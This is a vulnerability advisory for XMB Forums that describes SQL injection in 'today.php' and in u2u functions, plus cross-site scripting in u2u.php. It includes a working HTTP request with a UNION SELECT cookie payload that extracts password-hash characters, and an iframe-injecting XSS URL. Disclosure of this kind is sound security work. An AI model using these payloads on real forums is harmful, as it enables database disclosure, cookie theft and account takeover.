Description:
XMB Forums is a popular forum software written in php and mysql
that allows you to open up your own online community or
messageboard. There are a number of security issues in XMB Forums
that may allow for an attacker to perform SQL injection attacks
or cross site scripting attacks against the vulnerable web
application. These types of attacks may allow for disclosure of
sensitive data such as cookie information or contents from the
underlying database.



SQL Injection:
There are a number of SQL Injection issues in XMB Forums. The
first of these issues I will talk about is in 'today.php' and
is present due to the lack of sanitation when attempting to
handle cookie data in regards to password protected forums.

     if ( X_MEMBER ) {
         // let's add fids for passworded forums that the user can access
         $r2 = array();
         foreach ($_COOKIE as $key=>$val) {
             if (preg_match('#^fidpw([0-9]+)$#', $key, $fetch)) {
                 $r2[] = "(fid='$fetch[1]' AND password='$val')";
             }
         }
         if (count($r2) > 0) {
             $r = implode(' OR ', $r2);
             $q = $db->query("SELECT fid FROM $table_forums WHERE $r");
             while($f = $db->fetch_array($q)) {
                 $fids[] = $f['fid'];
             }
         }
     }

The above code, which is taken from 'today.php' never sanitizes the variable
$val which makes SQL Injection possible.

GET /today.php HTTP/1.1
Host: xmb
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) 
Firefox/1.5
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: http://xmb/viewthread.php?tid=2&page=1
Cookie: xmblva=1137629907; xmbuser=james; 
xmbpw=44cc344d25a2ffe540adbd5678e2394c;
fidpw0=') UNION SELECT uid FROM xmb_members WHERE uid=1 AND 
MID(password,1,1)=2/*
Cache-Control: max-age=0

For example, the above request would show any topics from the last 24hrs
including ones the user does not have access to, and should not see, as
long as the user with the uid of 1 has a password hash that starts with
the number two. Otherwise only posts that the user has access to will be
shown. Also, in addition to this SQL Injection issue are a few others
that are a result of the $u2u_select array not being properly sanitized
before being passed to several functions. The vulnerable functions are
u2u_mod_delete(), u2u_mod_move(), and u2u_mod_markUnread(). These three
vulnerable function calls are present in u2u.inc.php



Cross Site Scripting:
In addition to the previously mentioned SQL Injection issues, there is
also a cross site scripting issue in the way the u2u feature handles
GPC data when composing messages etc.

http:///xmb/u2u.php?action=send&username=%22%3E%3Ciframe%3E

An attacker could use this vulnerability to steal a users cookie data
and possibly take control of the victims account.



Solution:
The vendor did not respond to our contact attempts.
